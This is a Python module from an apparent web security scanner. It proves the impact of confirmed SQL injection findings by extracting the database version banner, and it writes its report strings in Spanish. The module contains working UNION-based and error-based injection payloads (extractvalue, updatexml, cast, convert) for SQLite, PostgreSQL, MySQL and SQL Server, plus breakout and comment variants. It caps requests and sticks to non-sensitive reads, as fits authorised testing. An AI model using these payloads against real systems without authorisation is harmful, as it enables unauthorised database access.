"""Proof of impact: turn a *confirmed* finding from "this is vulnerable" into "this is what
an attacker can actually read".

Runs only over findings an oracle already confirmed, so it can never create a false positive:
it just tries a **bounded, read-only** extraction and, if it succeeds, attaches the extracted
value to ``finding.impact``. If it fails (hardened target, unusual dialect, budget spent), the
finding stands exactly as it was.

SQL injection (v1): recover the database version banner in-band — via a UNION whose columns are
each wrapped in a unique marker, or via a type-cast/XPath error that leaks the same. The version
banner is high-signal (it proves arbitrary DB read) and non-sensitive, so extraction stays safe.
The extracted value is rejected if it still contains our own SQL tokens (a reflected payload, not
evaluated output), which keeps the proof honest.
"""

from __future__ import annotations

import re
import secrets

import httpx

from dastcore.core.http_client import BudgetExceededError, HttpClient, OutOfScopeError
from dastcore.core.models import Finding, HttpRequest, HttpResponse
from dastcore.engine.rule_engine import build_mutated_request

_MAX_REQ_PER_FINDING = 24  # hard cap so extraction never becomes a mini brute-force
_VALUE_CAP = 200  # bounded: a version banner, not a data dump
_INJECTABLE = ("query", "body", "json")

# Substrings that mean we captured our *own* payload reflected back, not evaluated DB output.
_ECHO_MARKERS = (
    "version(",
    "select ",
    "concat",
    "||",
    "+@@",
    "@@version",
    "extractvalue",
    "updatexml",
    "cast(",
    "convert(",
)


async def prove_findings_impact(
    client: HttpClient,
    findings: list[Finding],
    *,
    families: frozenset[str] = frozenset({"sqli"}),
) -> int:
    """Enrich confirmed findings in place with proof of impact. Returns how many were enriched."""
    proven = 0
    for finding in findings:
        if finding.impact or finding.family not in families:
            continue
        proof: str | None = None
        if finding.family == "sqli":
            proof = await _prove_sqli(client, finding)
        if proof:
            finding.impact = proof
            proven += 1
    return proven


async def _send(client: HttpClient, request: HttpRequest) -> HttpResponse | None:
    try:
        return await client.request(
            request.method,
            request.url,
            params=request.params or None,
            headers=request.headers or None,
            cookies=request.cookies or None,
            data=request.data,
            json=request.json_body,
        )
    except (OutOfScopeError, BudgetExceededError, httpx.HTTPError):
        return None


def _clean(value: str) -> str:
    """Collapse whitespace, drop control chars, and bound the length."""
    printable = "".join(ch for ch in value if ch.isprintable() or ch in " \t")
    return " ".join(printable.split())[:_VALUE_CAP]


def _extract_between(text: str, left: str, right: str) -> str | None:
    """The first value our asymmetric delimiters bracket that is *evaluated* output, not our own
    payload echoed back. Reflecting apps (``Results for {query}``) print the raw payload too, so we
    scan every ``left…right`` pair and skip the ones that still carry SQL — the reflected literals."""
    for m in re.finditer(re.escape(left) + r"(.+?)" + re.escape(right), text, re.S):
        inner = _clean(m.group(1))
        lowered = inner.lower()
        if inner and left not in inner and right not in inner and not any(tok in lowered for tok in _ECHO_MARKERS):
            return inner
    return None


def _dbms_of(banner: str, hint: str) -> str:
    """Name the DBMS from the banner text, falling back to the dialect that produced it."""
    low = banner.lower()
    if "sqlite" in low:
        return "SQLite"
    if "mariadb" in low:
        return "MariaDB"
    if "postgresql" in low or "postgres" in low:
        return "PostgreSQL"
    if "sql server" in low or "microsoft sql" in low:
        return "Microsoft SQL Server"
    if "mysql" in low:
        return "MySQL"
    return hint


def _proof(banner: str, dbms: str, technique: str) -> str:
    return (
        f"Lectura de la base de datos confirmada vía SQL injection ({technique}). "
        f"DBMS: {dbms}. Valor extraído (solo lectura, acotado): «{banner}». "
        "Demuestra que un atacante puede leer datos arbitrarios de la base de datos."
    )


# UNION dialects: (column expr with {l}/{r} delimiters and {v} version fn, version fn, DBMS hint).
_UNION_PROFILES = [
    ("'{l}'||{v}||'{r}'", "sqlite_version()", "SQLite"),
    ("'{l}'||{v}||'{r}'", "version()", "PostgreSQL"),
    ("CONCAT('{l}',{v},'{r}')", "version()", "MySQL/MariaDB"),
    ("'{l}'+{v}+'{r}'", "@@version", "Microsoft SQL Server"),
]
_BREAKOUTS = [("'", "-- "), ("'", "-- -"), ("'", "#"), ("", "-- ")]

# Error-based one-shots: (expression template with {l}/{r} delimiters, DBMS hint).
_ERROR_PROFILES = [
    ("AND extractvalue(1,concat('{l}',version(),'{r}'))", "MySQL/MariaDB"),
    ("AND updatexml(1,concat('{l}',version(),'{r}'),1)", "MySQL/MariaDB"),
    ("AND 1=cast(('{l}'||version()||'{r}') as int)", "PostgreSQL"),
    ("AND 1=convert(int,'{l}'+@@version+'{r}')", "Microsoft SQL Server"),
]


async def _prove_sqli(client: HttpClient, finding: Finding) -> str | None:
    point = finding.injection_point
    if point.location not in _INJECTABLE:
        return None
    tok = secrets.token_hex(5)
    left, right = "dl" + tok, "dr" + tok  # asymmetric, alnum, HTML-safe delimiters
    junk = "zq" + secrets.token_hex(3)  # a LIKE prefix no real row matches, so only our UNION row returns
    budget = _MAX_REQ_PER_FINDING

    # 1) UNION-based: put the delimited version in every column, widening 1..8 until it lands.
    for breakout, comment in _BREAKOUTS:
        for tmpl, version_fn, hint in _UNION_PROFILES:
            col = tmpl.format(l=left, r=right, v=version_fn)
            for ncols in range(1, 9):
                if budget <= 0:
                    return None
                budget -= 1
                cols = ",".join([col] * ncols)
                payload = f"{junk}{breakout} UNION SELECT {cols}{comment}"
                resp = await _send(client, build_mutated_request(point, payload))
                if resp is None:
                    continue
                banner = _extract_between(resp.text, left, right)
                if banner:
                    return _proof(banner, _dbms_of(banner, hint), "UNION-based")

    # 2) Error-based: a single crafted cast/XPath error that leaks the same banner.
    for breakout, comment in (("'", "-- "), ("", "-- ")):
        for tmpl, hint in _ERROR_PROFILES:
            if budget <= 0:
                return None
            budget -= 1
            payload = f"{junk}{breakout} {tmpl.format(l=left, r=right)}{comment}"
            resp = await _send(client, build_mutated_request(point, payload))
            if resp is None:
                continue
            banner = _extract_between(resp.text, left, right)
            if banner:
                return _proof(banner, _dbms_of(banner, hint), "basada en error")

    return None
